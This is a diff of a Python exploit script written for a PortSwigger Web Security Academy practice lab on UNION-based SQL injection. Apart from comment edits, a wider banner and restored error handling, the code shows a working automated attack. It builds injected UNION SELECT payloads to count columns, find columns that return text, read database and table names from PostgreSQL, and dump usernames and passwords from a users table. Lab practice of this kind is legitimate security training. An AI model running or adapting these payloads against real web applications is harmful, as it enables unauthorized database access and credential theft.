@@ -62,7 +62,7 @@ def check_response_code(url, uri, payload, no_proxy):
     
     return resp.status_code
 
-def get_number_column(url, uri, no_proxy) : # Final Payload: 'UNION+SELECT+NULL,NULL--
+def get_number_column(url, uri, no_proxy) : 
     columns = 1 
     while True:
         payload = "'+UNION+SELECT+" + "NULL,"*(columns-1) + "NULL--"
@@ -84,7 +84,7 @@ def get_number_column(url, uri, no_proxy) : # Final Payload: 'UNION+SELECT+NULL,
             sys.exit(-1)
 
 def get_string_column(url, uri, number_columns, no_proxy) :
-    columns_list = [0] * number_columns    # a list with length of number of columns found and filled with zeros
+    columns_list = [0] * number_columns    
 
     for i in range(number_columns) :
         null_count = number_columns -i -1
@@ -122,7 +122,7 @@ def get_current_db_name(url, uri, columns_string, no_proxy) :       # Payload: '
         if (columns_string[i] == 1) :
             null_count = len(columns_string) -i -1
             nulls = "NULL," * null_count
-            payload = "'+UNION+SELECT+" + nulls + "current_database()" + ",NULL" * i + "--"      # Payload to get the version of the database
+            payload = "'+UNION+SELECT+" + nulls + "current_database()" + ",NULL" * i + "--"      # Payload to get the current db name 
             log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload + Fore.WHITE + " and sending ...")
             if (no_proxy) : 
                 resp = requests.get(url + uri + payload, verify=False)
@@ -143,7 +143,7 @@ def get_all_dbs_names(url, uri, columns_string, no_proxy) :         # Payload: '
         if (columns_string[i] == 1) :
             null_count = len(columns_string) -i -1
             nulls = "NULL," * null_count
-            payload = "'+UNION+SELECT+" + nulls + "datname+" + ",NULL" * i + "FROM+pg_database--"     # Payload to get the names of the databases
+            payload = "'+UNION+SELECT+" + nulls + "datname+" + ",NULL" * i + "FROM+pg_database--"     # Payload to get the names of the available databases
             log.info(Style.BRIGHT + Fore.WHITE + "[" + Fore.GREEN + "+" + Fore.WHITE +  "]" + Fore.WHITE + " Injecting the payload: " + Style.BRIGHT + Fore.RED + payload + Fore.WHITE + " and sending ...")
             if (no_proxy) : 
                 resp = requests.get(url + uri + payload, verify=False)
@@ -205,14 +205,14 @@ def get_columns (url, uri, columns_string, tables_names, no_proxy) :          # 
         else: 
             log.info(Fore.WHITE + "[" + Fore.RED + "-" + Fore.WHITE + "]" + Style.BRIGHT + Fore.RED + " Could not find a column that return string data to get the tables of the current db :(") 
                
-    return columns_names        # This will return a list containing columns names of the table 'users'
+    return columns_names       
 
 def dump_data(url, uri, columns_string, columns_names, no_proxy) :             # Payload: '+UNION+SELECT+username,password+FROM+users--    
     for i in range(len(columns_string)) :
         if (columns_string[i] == 1) :
             null_count = len(columns_string) -i -1
             nulls = "NULL," * null_count
-            usernames_payload = "'+UNION+SELECT+" + nulls + columns_names[0] + ",NULL" * i + "+FROM+users--"
+            usernames_payload = "'+UNION+SELECT+" + nulls + columns_names[0] + ",NULL" * i + "+FROM+users--"    # Payload to retrieve data from user's table 
             passwords_payload = "'+UNION+SELECT+" + nulls + columns_names[1] + ",NULL" * i + "+FROM+users--"
             if (no_proxy) : 
                 resp1 = requests.get(url + uri + usernames_payload, verify=False)
@@ -291,16 +291,16 @@ if __name__ == "__main__":
         session = requests.Session()
 
         banner = Style.BRIGHT + Fore.BLUE + f"""
-{'-'*100}
+{'-'*125}
 # Platform          : Web Security Academy Portswigger			
 # Web Vulnerability : SQL Injection
 # Type              : Server-side
-{'-'*100}
-{'-'*100}
+{'-'*125}
+{'-'*125}
 # Lab #5            : SQL injection UNION attack, retrieving data from other tables
 # Lab Level         : Practitioner
 # Link              : https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
-{'-'*100}
+{'-'*125}
         """
         print(banner)
         sleep(1)
@@ -308,6 +308,7 @@ if __name__ == "__main__":
         sleep(1)
         log.info(Fore.WHITE + "[" + Fore.BLUE + "*" + Fore.WHITE + "]" + " Testing connection to the target URL")
 
+        check_if_already_been_solved(url)
 
         if is_url_reachable(url):
             
@@ -420,5 +421,5 @@ if __name__ == "__main__":
         print("\n")
         log.info(Fore.RED + "[-] The exploit has been INTERRUPTED !")
 
-    # except Exception as e:
-    #     log.info(Fore.RED + "[-] " + str(e))
+    except Exception as e:
+        log.info(Fore.RED + "[-] " + str(e))
